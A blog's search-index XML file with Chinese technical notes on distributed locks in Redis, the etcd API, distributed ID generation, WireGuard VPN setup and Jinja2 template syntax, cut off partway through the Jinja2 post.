<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>分布式锁的实现</title>
      <link href="2022/02/10/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>2022/02/10/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="分布式锁的实现"><a href="#分布式锁的实现" class="headerlink" title="分布式锁的实现"></a>分布式锁的实现</h1><p>分布式锁应具备以下特点：</p><ul><li>互斥：在任意时刻，锁最多只能被同一个客户端（进程所持有）</li><li>防死锁：避免死锁情况，当一个客户端在持有锁期间内，由于意外崩溃而导致锁未能主动解锁，其持有的锁也能够被正确释放，并保证后续其它客户端也能正常加锁</li><li>高可用：分布式锁需要有一定的高可用能力，当提供锁的服务节点故障（宕机）时不影响服务运行，避免单点风险，如Redis的集群模式、哨兵模式，ETCD/zookeeper的集群选主能力等保证HA，保证自身持有的数据与故障节点一致。</li><li>可重入性：对同一个锁，加锁和解锁必须是同一个进程。该进程持有的锁不能被其他进程所释放，也不能释放其他进程所持有的锁。</li></ul><h2 id="1-基于Mysql"><a href="#1-基于Mysql" class="headerlink" title="1. 基于Mysql"></a>1. 基于Mysql</h2><p>{note, info red, 基于Mysql的分布式锁性能较差，实际上使用的不多。}</p><h2 id="2-基于Redis"><a href="#2-基于Redis" class="headerlink" title="2. 基于Redis"></a>2. 基于Redis</h2><h3 id="2-1-setnx-lua"><a href="#2-1-setnx-lua" class="headerlink" title="2.1 setnx+lua"></a>2.1 setnx+lua</h3><ul><li><p><code>lock</code>：SET resource_name unique_value NX PX timeout</p></li><li><p><code>unlock</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if redis.call(&quot;get&quot;,KEYS[1]) == ARGV[1] then</span><br><span class="line">    return redis.call(&quot;del&quot;,KEYS[1])</span><br><span class="line">else</span><br><span class="line">    return 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>lock时，需要通过设置timeout防死锁</p></li><li><p>unlock时，需要先比较value，如果value相同才能删除，是为了防止误解锁，解了其他客户端（进程）加的锁。因此，value需要具有唯一性。</p></li></ul><p>问题：</p><ul><li>Redis的加锁只是在单个节点写入。如果在主从复制的过程中，master节点发生故障，可能无法把锁同步给slave，导致锁丢失。</li></ul><h3 id="2-2-RedLock"><a href="#2-2-RedLock" class="headerlink" title="2.2 RedLock"></a>2.2 RedLock</h3><p>该方案也是基于set命令枷锁和lua脚本实现的。假设有N个Redis节点，例如N=5，这些节点之间是完全独立，我们不适用复制或者任何协调系统，客户端要获取锁的步骤如下：</p><ul><li>获取当前时间，以毫秒为单位。</li><li>依次尝试从5个实例中，使用相同的key和随机值获取锁。当向Redis请求获取锁时，客户端应该设置一个超时时间，这个超时时间应该小于锁的失效时间。例如锁的自动失效时间为10秒时，则超时时间因该在5-50毫秒之间。这样可以防止客户端在试图与一个当即的Redis节点对话长时间处于阻塞状态。如果一个实例不可用，客户端应该尽快尝试去与另外一个Redis实例请求获取锁。</li><li>客户端通过当前时间减去步骤 1 记录的时间来计算获取锁使用的时间。当且仅当从大多数（N/2+1，这里是 3 个节点）的 Redis 节点都取到锁，并且获取锁使用的时间小于锁失效时间时，锁才算获取成功。</li><li>如果取到了锁，其真正有效时间等于初始有效时间减去获取锁所使用的时间（步骤 3 计算的结果）。</li><li>如果由于某些原因未能获得锁（无法在至少 N/2 + 1 个 Redis 实例获取锁、或获取锁的时间超过了有效时间），客户端应该在所有的 Redis 实例上进行解锁（即便某些Redis实例根本就没有加锁成功，防止某些节点获取到锁但是客户端没有得到响应而导致接下来的一段时间不能被重新获取锁）。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Etcd API</title>
      <link href="2022/01/15/Etcd/"/>
      <url>2022/01/15/Etcd/</url>
      
        <content type="html"><![CDATA[<h3 id="核心API"><a href="#核心API" class="headerlink" title="核心API"></a>核心API</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">service KV &#123;</span><br><span class="line">  // 从键值存储中获取范围内的key.</span><br><span class="line">  rpc Range(RangeRequest) returns (RangeResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // 放置给定key到键值存储.</span><br><span class="line">  // put请求增加键值存储的修订版本并在事件历史中生成一个事件.</span><br><span class="line">  rpc Put(PutRequest) returns (PutResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // 从键值存储中删除给定范围。</span><br><span class="line">  // 删除请求增加键值存储的修订版本并在事件历史中为每个被删除的key生成一个删除事件.</span><br><span class="line">  rpc DeleteRange(DeleteRangeRequest) returns (DeleteRangeResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // 在单个事务中处理多个请求。</span><br><span class="line">  // 一个 txn 请求增加键值存储的修订版本并为每个完成的请求生成带有相同修订版本的事件。</span><br><span class="line">  // 不容许在一个txn中多次修改同一个key.</span><br><span class="line">  rpc Txn(TxnRequest) returns (TxnResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // 压缩在etcd键值存储中的事件历史。</span><br><span class="line">  // 键值存储应该定期压缩，否则事件历史会无限制的持续增长.</span><br><span class="line">  rpc Compact(CompactionRequest) returns (CompactionResponse) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service Watch &#123;</span><br><span class="line">   // Watch 观察将要发生或者已经发生的事件。</span><br><span class="line">   // 输入和输出都是流;输入流用于创建和取消观察，而输出流发送事件。</span><br><span class="line">   // 一个观察 RPC 可以在一次性在多个key范围上观察，并为多个观察流化事件。</span><br><span class="line">   // 整个事件历史可以从最后压缩修订版本开始观察。</span><br><span class="line">  rpc Watch(stream WatchRequest) returns (stream WatchResponse) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">service Lease &#123;</span><br><span class="line">  // LeaseGrant 创建一个租约，当服务器在给定 time to live 时间内没有接收到 keepAlive 时租约过期。</span><br><span class="line">  // 如果租约过期则所有附加在租约上的key将过期并被删除。</span><br><span class="line">  // 每个过期的key在事件历史中生成一个删除事件。</span><br><span class="line">  rpc LeaseGrant(LeaseGrantRequest) returns (LeaseGrantResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // LeaseRevoke 撤销一个租约。</span><br><span class="line">  // 所有附加到租约的key将过期并被删除。</span><br><span class="line">  rpc LeaseRevoke(LeaseRevokeRequest) returns (LeaseRevokeResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // LeaseKeepAlive 通过从客户端到服务器端的流化的 keep alive 请求和从服务器端到客户端的流化的 keep alive 应答来维持租约.</span><br><span class="line">  rpc LeaseKeepAlive(stream LeaseKeepAliveRequest) returns (stream LeaseKeepAliveResponse) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // LeaseTimeToLive 获取租约信息。</span><br><span class="line">  rpc LeaseTimeToLive(LeaseTimeToLiveRequest) returns (LeaseTimeToLiveResponse) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Etcd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式唯一ID</title>
      <link href="2021/10/28/%E5%88%86%E5%B8%83%E5%BC%8F%E5%94%AF%E4%B8%80ID/"/>
      <url>2021/10/28/%E5%88%86%E5%B8%83%E5%BC%8F%E5%94%AF%E4%B8%80ID/</url>
      
        <content type="html"><![CDATA[<h1 id="分布式唯一ID"><a href="#分布式唯一ID" class="headerlink" title="分布式唯一ID"></a>分布式唯一ID</h1><h2 id="一、分布式唯一ID"><a href="#一、分布式唯一ID" class="headerlink" title="一、分布式唯一ID"></a>一、分布式唯一ID</h2><p>ID是一种唯一的标识。在开发中，经常需要使用ID来唯一标识数据。例如，原神中给每个用户分配一个UID。</p><p>在最简单的情况下，可以使用数据库的主键自增，自动实现唯一ID。如<code>Mysql</code>的<code>AUTO_INCREMENT</code>。但这种方式具有一定的缺点：一方面，由于依赖于数据库自动实现ID自增，这意味着只有在完成数据的插入之后，才能获得改数据的ID。对于一些需要双向引用的数据，将不得不在插入两份数据后，再做一次更新操作，才能实现双向引用。另一方面，也是最重要的一方面，在分布式系统中，可能需要对数据库进行分库分表。一旦分库分表，通过数据库主键自增的方法将无法再保证ID的唯一性。</p><p>因此，在分布式的场景中，往往会设计一种ID生成器，去实现分布式ID的生成。</p><p>分布式ID需要<strong>尽可能</strong>满足以下要求：</p><ul><li>唯一性：保证ID在分布式系统中全局唯一。</li><li>有序性：保证ID有序（一般是递增），有序的ID在很多场景下有利于性能的提升。</li><li>安全性：ID本身不能暴露出敏感信息。</li></ul><h2 id="二、常用方案"><a href="#二、常用方案" class="headerlink" title="二、常用方案"></a>二、常用方案</h2><h3 id="2-1-数据库号段模式"><a href="#2-1-数据库号段模式" class="headerlink" title="2.1 数据库号段模式"></a>2.1 数据库号段模式</h3><p>事实上，仍然可以通过数据库的主键自增，实现唯一ID的生成。只要分布式系统中所有的机器都只使用同一个数据库主键自增生成ID，而不是在自己的数据库服务中生成ID，就不会出现上述的情况。</p><p>但实际上，这样操作是不现实的。作为ID生成器的一台数据库服务器往往无法负担起整个分布式系统的请求。</p><p><strong>数据库号段模式</strong>正是一种改进措施。每次访问用于生成ID的数据库服务器时，直接批量获取多个ID，称为获取一个号段，如获取ID：(1, 1000]。将ID缓存在本地，业务需要ID时直接从缓存中获取。直至缓存中的ID用尽，再重新去请求生成ID的数据库服务器。</p><h3 id="2-2-UUID"><a href="#2-2-UUID" class="headerlink" title="2.2 UUID"></a>2.2 UUID</h3><p>UUID是<code>Universally Unique Identifier</code>，即<code>通用唯一标识</code>。</p><p>UUID是36个字符的字符串，格式为：<code>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code>。UUID生成算法当前有5个版本：</p><ul><li>version 1, date-time &amp; MAC address</li><li>version 2, date-time &amp; group/user id</li><li>version 3, MD5 hash &amp; namespace</li><li>version 4, pseudo-random number</li><li>version 5, SHA-1 hash &amp; namespace</li></ul><p>对于version1和version4，由于时间戳和随机数的唯一性，可以保证生成的UUID是唯一的。</p><p>优点：</p><ul><li>易于使用</li><li>生成UUID的速度较快</li></ul><p>缺点：</p><ul><li>字符串太长，占用空间。</li><li>作为无序的字符串，不适合用作数据库的主键或索引（速度太慢）</li><li>基于MAC地址的UUID生成算法可能导致泄露MAC地址</li></ul><h3 id="2-3-Snowflake"><a href="#2-3-Snowflake" class="headerlink" title="2.3 Snowflake"></a>2.3 Snowflake</h3><p>Snowflake 是 Twitter 开源的分布式 ID 生成算法。Snowflake由64bit组成。</p><p><img src="https://gitee.com/saying_yy/blog-image/raw/master/img/20211028161716.png" class="lazyload" data-srcset="https://gitee.com/saying_yy/blog-image/raw/master/img/20211028161716.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><ul><li>第0位表示符号，一定为正，故第0位一定为0。</li><li>第1—41位表示时间戳。以毫秒为单位，<code>2^41</code>毫秒约可以表示69年的范围。但是指的注意的是，这里的时间戳并非传统意义的unix时间戳，不必从1970年1月1日开始计时，而是一种相对的时间戳，可以任意选取计时的起点。</li><li>第42—52位表示<code>workerID</code>。即工作机器的ID。可以保证在不同的机器上生成的ID互不相同。</li><li>第53—64位表示序列号。序列号是自增的，用来保证某个机器每毫秒生成的ID互不相同。故，1ms的时间中，一个worker最大能够生成<code>2^12</code>个ID。</li></ul><p>优点：</p><ul><li>生成速度较快，生成的ID有序。</li></ul><p>缺点：</p><ul><li>如果发生时钟回拨，可能会产生重复ID。</li></ul><h3 id="2-4-Leaf"><a href="#2-4-Leaf" class="headerlink" title="2.4 Leaf"></a>2.4 Leaf</h3><p><code>Leaf</code>是美团的分布式ID生成框架。支持号段模式，也支持snowflake模式。</p><p>具体细节可以参考<a href="https://tech.meituan.com/2017/04/21/mt-leaf.html">美团官方技术团队的文章</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireguard基础配置</title>
      <link href="2021/09/06/wireguard%E9%85%8D%E7%BD%AE/"/>
      <url>2021/09/06/wireguard%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p> 本文配置的wireguard只是为了**（</p><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository ppa:wireguard/wireguard</span><br><span class="line">apt update</span><br><span class="line">apt install wireguard</span><br></pre></td></tr></table></figure><h3 id="2-创建配置文件-服务器"><a href="#2-创建配置文件-服务器" class="headerlink" title="2.创建配置文件(服务器)"></a>2.创建配置文件(服务器)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.wireguard</span><br><span class="line">cd ~/.wireguard/</span><br><span class="line">wg genkey | tee pri1 | wg pubkey &gt;pub1#生成服务器私钥、公钥</span><br><span class="line">wg genkey | tee pri2 | wg pubkey &gt;pub2#生成客户端私钥、公钥</span><br><span class="line">chmod 600 pri1</span><br><span class="line">chmod 600 pri2</span><br></pre></td></tr></table></figure><p>创建wg0.conf文件：</p><details green><summary> 服务器配置文件`/etc/wireguard/wg0.conf` </summary>              <div class='content'>              <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey = 服务器私钥</span><br><span class="line">Address = 10.0.0.1/24</span><br><span class="line">ListenPort = 54321</span><br><span class="line">PostUp   = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens17 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ens17 -j MASQUERADE</span><br><span class="line">DNS = 8.8.8.8</span><br><span class="line">MTU = 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = 客户端公钥</span><br><span class="line">AllowedIPs = 10.0.0.2/24</span><br></pre></td></tr></table></figure>              </div>            </details><p><strong>还需要开启转发</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.confsysctl -p</span><br></pre></td></tr></table></figure><h3 id="3-启动"><a href="#3-启动" class="headerlink" title="3.启动"></a>3.启动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br></pre></td></tr></table></figure><p>事实上中间运行时出了点问题，需要安装<code>resolvconf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install openresolv</span><br></pre></td></tr></table></figure><h3 id="4-客户端配置"><a href="#4-客户端配置" class="headerlink" title="4.客户端配置"></a>4.客户端配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey = 客户端私钥</span><br><span class="line">Address = 10.0.0.2/24</span><br><span class="line">DNS = 8.8.8.8</span><br><span class="line">MTU = 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = 服务器公钥</span><br><span class="line">AllowedIPs = 0.0.0.0/0</span><br><span class="line">Endpoint = 204.44.92.171:54321</span><br><span class="line">PersistentKeepalive = 25</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_jinja2</title>
      <link href="2021/06/12/flask-jinja2/"/>
      <url>2021/06/12/flask-jinja2/</url>
      
        <content type="html"><![CDATA[<p> 挺久之前氵的笔记<span id="more"></span></p><h3 id="0-jinja2-vs-Django-template"><a href="#0-jinja2-vs-Django-template" class="headerlink" title="0. jinja2 vs Django template"></a>0. jinja2 vs Django template</h3><ul><li><p><strong>性能上</strong></p><p>jinja2能够比Django的模版引擎快10到20倍</p></li><li><p><strong>语法上</strong></p><p>概括来说，可以总结为：<strong>Jinja的语法更接近于python的语法，Jinja模版中可以使用某些Python表达式的子集</strong>。</p><p>例如，拼接列表操作中，可以看出Jinja中过滤器更像是对象的方法的调用：</p><p>Django：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|join:&quot;, &quot; &#125;&#125;</span><br><span class="line">##  &#123;&#123;obj|filter_name:param&#125;&#125;</span><br></pre></td></tr></table></figure><p>Jinja：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|join(&#x27;, &#x27;) &#125;&#125;</span><br><span class="line">##  &#123;&#123;obj|filter_name(param)&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>更多详细的不同可以参考<a href="https://jinja.palletsprojects.com/en/master/switching/#django">官方文档中相关内容</a></li></ul><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>Jinja模版与普通的html相比，包含两个特殊的部分：</p><ul><li>标签：用于控制模版的逻辑</li><li>变量/表达式：用于在模版渲染时替换为值</li></ul><p>Jinja中的默认分隔符如下：</p><ul><li><p><code>&#123;% ... %&#125;  </code>用于语句（标签）</p></li><li><p><code>&#123;&#123; ... &#125;&#125;</code>用于打印表达式的输出</p></li><li><p><code>&#123;# ... #&#125;</code>用于注释</p></li><li><p><code># … ##</code>    行语句，需要应用程序启用此功能，功能类似于<code>&#123;% ... %&#125;</code>，例如，以下两段示例完全等效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line"># for item in seq</span><br><span class="line">    &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line"># endfor</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for item in seq %&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></li></ul><p><em>关于行语句，由于功能完全类似于<code>&#123;% ... %&#125;</code>，可以忽略</em></p><h3 id="2-基本语法"><a href="#2-基本语法" class="headerlink" title="2.基本语法"></a>2.基本语法</h3><h4 id="2-1-变量"><a href="#2-1-变量" class="headerlink" title="2.1 变量"></a>2.1 变量</h4><p>除了普通的字符串变量，Jinja2还支持列表、字典和对象，你可以这样获取变量值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; mydict[&#x27;key&#x27;] &#125;&#125;</span><br><span class="line">&#123;&#123; mylist[3] &#125;&#125;</span><br><span class="line">&#123;&#123; mylist[myintvar] &#125;&#125;</span><br><span class="line">&#123;&#123; myobj.somemethod() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;# 获取变量属性 #&#125;</span><br><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-变量赋值"><a href="#2-2-变量赋值" class="headerlink" title="2.2 变量赋值"></a>2.2 变量赋值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set navigation = [(&#x27;index.html&#x27;, &#x27;Index&#x27;), (&#x27;about.html&#x27;, &#x27;About&#x27;)] %&#125;</span><br><span class="line">&#123;% set key, value = call_something() %&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-控制结构"><a href="#2-3-控制结构" class="headerlink" title="2.3 控制结构"></a>2.3 控制结构</h4><h5 id="2-3-1-for"><a href="#2-3-1-for" class="headerlink" title="2.3.1 for"></a>2.3.1 for</h5><p>使用方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Members&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">  &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p><em><strong>循环语句中字典可能无序，可使用dictsort过滤器</strong></em></p><p>相比于Python中的for循环，使用Jinja时，在for循环的循环体中可以使用一些特殊的变量：</p><p><img src="https://gitee.com/saying_yy/blog-image/raw/master/img/20210506011636.png" class="lazyload" data-srcset="https://gitee.com/saying_yy/blog-image/raw/master/img/20210506011636.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="avatar"></p><h5 id="2-3-2-if"><a href="#2-3-2-if" class="headerlink" title="2.3.2 if"></a>2.3.2 if</h5><p>if的使用十分类似于Python中的if。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if kenny.sick %&#125;</span><br><span class="line">    Kenny is sick.</span><br><span class="line">&#123;% elif kenny.dead %&#125;</span><br><span class="line">    You killed Kenny!  You bastard!!!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    Kenny looks okay --- so far</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-宏"><a href="#2-4-宏" class="headerlink" title="2.4 宏"></a>2.4 宏</h4><p>Jinja中的宏（macro）类似于常规编程语言中的宏。宏的存在是为了替换简单的多次重复的代码。</p><p>例如，可以首先定义一个宏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro input(name, value=&#x27;&#x27;, type=&#x27;text&#x27;, size=20) -%&#125;</span><br><span class="line">    &lt;input type=&quot;&#123;&#123; type &#125;&#125;&quot; name=&quot;&#123;&#123; name &#125;&#125;&quot; value=&quot;&#123;&#123;</span><br><span class="line">        value|e &#125;&#125;&quot; size=&quot;&#123;&#123; size &#125;&#125;&quot;&gt;</span><br><span class="line">&#123;%- endmacro %&#125;</span><br></pre></td></tr></table></figure><p>然后可以像命名空间中的函数一样调用该宏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&#123;&#123; input(&#x27;username&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&#x27;password&#x27;, type=&#x27;password&#x27;) &#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>*如果宏是在其他模板中定义的，则必须首先将其[导入](#2.7 import)*。</p><h4 id="2-5-块——模板继承"><a href="#2-5-块——模板继承" class="headerlink" title="2.5 块——模板继承"></a>2.5 块——模板继承</h4><p>块的作用主要体现在模板继承。</p><p>在父模版中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;# base.html #&#125;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &#123;% block head %&#125;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; /&gt;</span><br><span class="line">    &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Webpage&lt;/title&gt;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;content&quot;&gt;&#123;% block content %&#125;&#123;% endblock %&#125;&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;footer&quot;&gt;</span><br><span class="line">        &#123;% block footer %&#125;</span><br><span class="line">        &amp;copy; Copyright 2008 by &lt;a href=&quot;http://domain.invalid/&quot;&gt;you&lt;/a&gt;.</span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>子模版中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class="line">&#123;% block title %&#125;Index&#123;% endblock %&#125;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        .important &#123; color: #336699; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &lt;h1&gt;Index&lt;/h1&gt;</span><br><span class="line">    &lt;p 